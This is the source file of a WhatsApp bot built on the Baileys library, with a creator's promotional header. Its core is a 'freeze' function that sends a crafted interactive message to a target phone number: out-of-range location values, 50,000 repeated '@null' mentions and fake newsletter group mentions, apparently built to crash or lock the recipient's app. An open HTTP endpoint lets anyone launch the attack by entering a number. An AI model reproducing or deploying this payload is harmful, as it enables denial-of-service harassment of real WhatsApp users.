//base by DGXeon (Xeon Bot Inc.)
//re-upload? recode? copy code? give credit ya :)
//YouTube: @DGXeon
//Instagram: unicorn_xeon13
//Telegram: @DGXeon
//GitHub: @DGXeon
//WhatsApp: +916909137213
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//telegram channel: https://t.me/+WEsVdEN2B9w4ZjA9

const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("baileys")
const fs = require('fs')
const util = require('util')
const express = require('express');

const app = express();
const PORT = process.env.PORT || '3000';

module.exports = async (XeonBotInc, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (XeonBotInc.user.id.split(':')[0]+'@s.whatsapp.net' || XeonBotInc.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
//====================================\\
// Function to convert phone number to WhatsApp JID
function toWhatsAppJID(phoneNumber) {
    if (!phoneNumber) throw new Error('Phone number is required');
    // Remove the "+" sign if present
    return phoneNumber.replace(/\+/g, '') + '@s.whatsapp.net';
}

// Function to send a freeze message
async function freezekamoflase(target) {
    try {
        const jid = toWhatsAppJID(target); // Convert phone number to JID
        console.log(`Sending freeze message to: ${jid}`);
        await XeonBotInc.relayMessage(jid, {
            groupMentionedMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            locationMessage: {
                                degreesLatitude: 414058.5,
                                degreesLongitude: 131518.0,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: `𝐃𝐘𝐍𝐀𝐌𝐈𝐂 𝐕2 🏴‍☠️ ${"@null ".repeat(50000)}`,
                            contextInfo: { mentionedJid: ["null@s.whatsapp.net"] },
                        },
                        nativeFlowMessage: {},
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                            groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: "𝐑𝐞𝐚𝐥🦣" }],
                        },
                    },
                },
            },
        }, { participant: { jid } }, { messageId: null });
    } catch (err) {
        console.error('Error in freezekamoflase:', err);
    }
}
//====================================\\
app.use(express.json()); // Middleware to parse JSON bodies

// API endpoint for freezekamoflase
app.get('/freezekamoflase', async (req, res) => {
    const { target } = req.query; // Access the target parameter from the query string

    if (!target) {
        return res.status(400).send('Target is required');
    }

    try {
        await freezekamoflase(target);
        res.send(`Freeze message sent to ${target}`);
    } catch (error) {
        console.error(error);
        res.status(500).send('An error occurred while sending the freeze message');
    }
});
//====================================\\
// Start the server and connect to WhatsApp
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
}); // Ensure this closing brace matches the opening brace of the app.listen function

} catch (err) {
console.log(util.format(err))
}
}
